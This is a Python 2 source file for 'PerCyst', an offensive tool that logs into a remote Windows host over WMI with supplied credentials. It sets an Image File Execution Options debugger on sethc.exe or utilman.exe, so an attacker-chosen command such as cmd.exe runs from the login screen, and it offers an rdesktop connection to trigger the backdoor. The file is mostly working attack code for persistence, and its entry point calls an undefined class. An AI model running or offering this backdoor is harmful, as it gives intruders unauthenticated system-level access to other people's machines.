import subprocess
import sys
import wmiexec


# Author: Steve Laura

class AccessibilityFeat:

    def __init__(self, ip, username, password, share):
        self.ip = ip
        self.username = username
        self.passwd = password
        self.share = share


    def setPercyst(self):
        #Menu to choose the Accessibility Feature to Modify
        print "Please choose the Accessibility Feature to Modify with PerCyst:"
        print "  1. C:\\Windows\\System32\\sethc.exe (Sticky Keys {Shift 5 times})"
        print "  2. C:\\Windows\\System32\\utilman.exe (Utility Manager {Win + U})"
        print "  Q. Quit"
        choice = raw_input(">> ")

        if choice == str(1):
            choice = "sethc.exe"
        elif choice == str(2):
            choice = "utilman.exe"
        elif choice.lower() == 'q':
            print('\n[-] Thanks for using PerCyst\n')
            sys.exit()
        else:
            print('Invalid Choice')
            sys.exit()

        #Entering the command to run
        Command1 = raw_input("[!] Enter a command to run, such as cmd.exe: ")
        cmd = 'REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\' + choice + '" /t REG_SZ /v Debugger /d "' + Command1.lower() + '" /f'
        self.runCmd(cmd)

        #Connect with rdesktop to run
        ask1 = raw_input("[!] Do you want to connect to the host with rdesktop now? [Y/N] ")
        if ask1.lower() == 'y':
            subprocess.Popen(["rdesktop", '-u ""', str(self.ip)])
        else:
            sys.exit()


    def cleanup(self):
        #Menu to choose which Accessibility Feature to Cleanup
        print "Please choose the Accessibility Feature to Cleanup with PerCyst:"
        print "  1. C:\\Windows\\System32\\sethc.exe (Sticky Keys {Shift 5 times})"
        print "  2. C:\\Windows\\System32\\utilman.exe (Utility Manager {Win + U})"
        print "  Q. Quit"
        choice = raw_input(">> ")

        #Setting the value for choice, or exiting if Quit was chosen
        if choice == str(1):
            choice = "sethc.exe"
            cmd = 'REG DELETE "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\' + choice + '" /f'
            featRemove = self.runCmd(cmd)

        elif choice == str(2):
            choice = "utilman.exe"
            cmd = 'REG DELETE "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\' + choice + '" /f'
            featRemove = self.runCmd(cmd)

        elif choice.lower() == 'q':
            print('\n[-] Thanks for using PerCyst\n')
            sys.exit()
        else:
            print('Invalid Choice')
            sys.exit()


    def runCmd(self, cmd):
        print("[+] Cyst attaching to host")
        execute1 = wmiexec.WMIEXEC(command=cmd, username=self.username, password=self.passwd, share=self.share)#, noOutput=True)
        execute1.run(self.ip)


    def ascii(self):
        print('perCYST\n\n<INSERT ASCII ART HERE>\n\n')


if __name__ == '__main__':
    RegRun().ascii()
